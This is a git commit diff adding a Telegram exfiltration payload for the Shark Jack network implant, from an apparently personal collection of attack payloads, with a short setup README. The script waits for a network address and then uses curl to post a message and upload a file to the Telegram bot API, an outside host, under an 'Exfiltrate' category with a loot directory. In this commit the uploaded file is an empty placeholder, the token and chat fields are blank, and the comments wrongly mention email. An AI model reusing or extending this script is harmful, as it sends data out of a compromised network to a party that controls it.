9337dfb36381ad3bfe8b025a42760b14c20ba3e1
jboz <jules.bozouklian@epitech.eu>
2022-01-19 18:52:51 +0100

    add exfiltration payload work with telegram

---
+++ payload/exfiltrate/telegram/README.md
@@ -0,0 +1,7 @@
+- Install following packages : ``` curl ```
+- Refer to this payload to install package https://github.com/julesbozouklian/shark_jack_payload/blob/main/payload/util/install_package.sh
+- Or SSH to the Shark jack and use following command : ``` opkg install curl ```
+
+
+créer un bot
+envoyer un message au bot
--- payload/exfiltrate/telegram/payload.sh
+++ payload/exfiltrate/telegram/payload.sh
@@ -1,15 +1,22 @@
-#!/bin/bh
-# Title:         Telegram
-# Description:   Exfiltrate data with telegram message
-# Author:        Jules Bozouklian - bozou_client
-# Version:       1.0
-# Category:      Exfiltrate
+#!/bin/sh
+# Title:        Telegram
+# Description:  Exfiltrate data with email
+# Author:       Jules Bozouklian - bozou_client
+# Version:      1.0
+# Category:     Exfiltrate
 #
 # LED SETUP (Magenta)... Setting logs and waiting for IP address from DHCP
+# LED ATTACK (Yellow)... Send email
 #
 
-LOG_DIR=/root/loot/exiltrate/telegram
+LOG_DIR=/root/loot/exfiltrate/telegram
 TIMESTAMP=`date +"%Y-%m-%d"`
+
+TOKEN=""
+CHANEL=""
+MESSAGE="Log from Shark Jack"
+API_URL="https://api.telegram.org/bot$TOKEN/sendMessage"
+API_FILE_URL="https://api.telegram.org/bot$TOKEN/sendDocument"
 
 LED SETUP
 
@@ -23,4 +30,18 @@ LOG="$LOG_DIR/$LOG_FILE"
 # Wait until Shark Jack has an IP address
 while [ -z "$IPADDR" ]; do sleep 1 && IPADDR=$(ifconfig eth0 | grep "inet addr"); done
 
-SUCCESS
+LED ATTACK
+
+# create a fake file to send
+touch /root/test-file.txt
+
+
+function sendToTelegram() {
+    curl -s -X POST $API_URL -d chat_id=$CHANEL -d text="$MESSAGE"
+		curl -v -F "chat_id=$CHANEL" -F document=/root/test-file.txt $API_FILE_URL
+}
+
+
+sendToTelegram
+
+LED FINISH
